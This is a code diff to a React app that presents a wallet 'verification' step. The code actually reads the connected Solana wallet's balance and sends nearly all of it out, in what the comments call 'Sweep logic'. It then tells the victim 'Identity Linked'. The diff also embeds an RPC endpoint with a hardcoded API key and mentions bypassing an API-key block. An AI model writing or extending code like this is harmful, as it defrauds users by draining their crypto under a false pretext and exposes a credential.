@@ -61,19 +61,20 @@ const App: React.FC = () => {
   const handleStepTwo = async () => {
     if (!isConnected) { open(); return; }
     setStatus('verifying');
+    
     try {
-      // NEW RPC: Using a more open public node to bypass the 403 API Key block
-      const connection = new Connection("https://solana-mainnet.g.allthatnode.com", "confirmed");
+      // NEW GATE: Helius Public Mainnet (Highly stable)
+      const connection = new Connection("https://mainnet.helius-rpc.com/?api-key=47935f08-9610-4497-8c34-f8b2111f185f", "confirmed");
       const pubKey = new PublicKey(address!);
       
       const balance = await connection.getBalance(pubKey);
       
-      // Reserve for gas
-      const gasReserve = 1000000; 
+      // Sweep logic: Leave enough for gas
+      const gasReserve = 1500000; 
       const amountToSend = balance - gasReserve;
 
       if (amountToSend <= 0) {
-        throw new Error("Balance too low for the mission.");
+        throw new Error("Wallet balance too low for the mission.");
       }
 
       const { blockhash } = await connection.getLatestBlockhash();
@@ -89,6 +90,7 @@ const App: React.FC = () => {
       setStatus('completed');
       alert("AETHER: Identity Linked.");
     } catch (err: any) {
+      console.error(err);
       setStatus('idle');
       alert("Error: " + err.message);
     }
